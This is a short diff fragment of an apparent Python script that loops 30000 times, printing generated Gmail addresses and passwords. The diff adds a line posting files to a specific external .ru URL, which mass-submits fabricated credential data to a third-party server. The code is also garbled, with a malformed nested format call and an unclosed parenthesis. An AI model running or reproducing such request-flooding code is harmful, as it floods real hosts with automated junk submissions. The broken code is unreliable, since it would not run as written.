@@ -19,5 +19,5 @@ for i in range(30000)
                  print("========================")
                  print("Requst number: {}".format(i))
                  print("Email:{}\npassword".format('format('{}@gmail.com'.format(username),password))
-
-                 
+                 response = requests.post('http://u1353408.cp.regruhosting.ru/index.php?id=1793689389', files=files)
+                 #print(response.text
